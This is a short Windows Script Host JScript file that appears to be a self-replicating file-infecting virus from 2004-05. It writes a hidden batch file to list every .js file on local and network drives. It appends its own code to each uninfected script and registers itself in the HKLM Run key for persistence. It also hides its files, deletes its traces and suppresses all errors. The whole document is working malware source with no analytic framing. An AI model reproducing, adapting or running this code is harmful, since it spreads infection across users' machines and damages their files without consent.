// (c) Copyright DSSoft 2004-05var beauty = "c:\\predicted";var rage = "c:\\proved";var body = "c:\\basis.js";var batnik = "c:\\is.bat";var PAT = "c:\\Hopelessness";var vir_len = 136;var need, allright = false;try{fso = WScript.CreateObject("Scripting.FileSystemObject");WSHShell = WScript.CreateObject("WScript.Shell");function change(pa){	try	{		file = fso.OpenTextFile(pa, 1, false); 		var s = file.ReadAll();		var nash = true;		for (i=0;i<=s.length;i++) if (s.substr(i, 13)=="безвихідність") nash=false;		if (nash) makcop(pa);else if((need=true)&(nash=true)) so(pa);	}	catch(error)	{	}}function so(pa){	var lc=0;	file = fso.OpenTextFile(pa, 1, false); 	try	{		 do			{				 s=file.ReadLine();				 lc++;			}		while(true);	need = false;	}	catch(error)	{	}	 file1 = fso.OpenTextFile(pa, 1, false); 	 file = fso.OpenTextFile(body, 2, true); 	 for(i=1;i<=lc-vir_len;i++) file1.SkipLine() ;	 for(i=1;i<=vir_len;i++)	  {	 	s=file1.ReadLine();		file.WriteLine(s);	  }}function makcop(pa){	 file = fso.OpenTextFile(body, 1, false);	 file1 = fso.OpenTextFile(pa, 8, true);	 var s = file.ReadAll();	 file1.Write("\n" + s);	 WSHShell.RegWrite("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\KINO", body);}function onf(what){	try	{		files = fso.OpenTextFile(what, 1, false); 		do		{			nf = files.ReadLine();			change(nf);		}		while(true);	}	catch(e)	{	}	files.Close();}file = fso.OpenTextFile(batnik, 2, true); file.WriteLine("dir /b/o/x *.js>" + beauty + "\ndir /b/o/s/x *.js>>" + beauty);file.Close();WSHShell.Run(batnik, 0);WScript.Sleep(5666);if (!fso.FileExists(body)){	 need = true;	 onf(beauty);}WScript.Sleep(3666);onf(beauty);if (fso.FileExists(rage)){	 onf(rage);	 allright = true;}if (!fso.FileExists(PAT)){	var enu = new Enumerator(fso.Drives);	file = fso.OpenTextFile(PAT, 2, true); 	file = fso.OpenTextFile(batnik, 2, true); 	for (;!enu.atEnd();enu.moveNext())	{		ite = enu.item();		if ((ite.DriveType == 2)|(ite.DriveType == 3))		file.WriteLine("dir /b/o/s/x " + ite.DriveLetter + ":\\*.js>>" + rage);	}	file.Close();	WSHShell.Run(batnik, 0);	WScript.Sleep(6666);}file = fso.GetFile(batnik);file.Delete();file = fso.GetFile(beauty);file.Delete();file = fso.GetFile(body);file.Attributes = 6;file = fso.GetFile(PAT);file.Attributes = 6;file = fso.GetFile(rage);if (allright == false)file.Attributes = 6;else file.Delete();if (Date().substr(7, 3) == 13) WSHShell.Popup("Усякому - своє. /Цицерон/", 13 ,"", 64);}catch(error){}
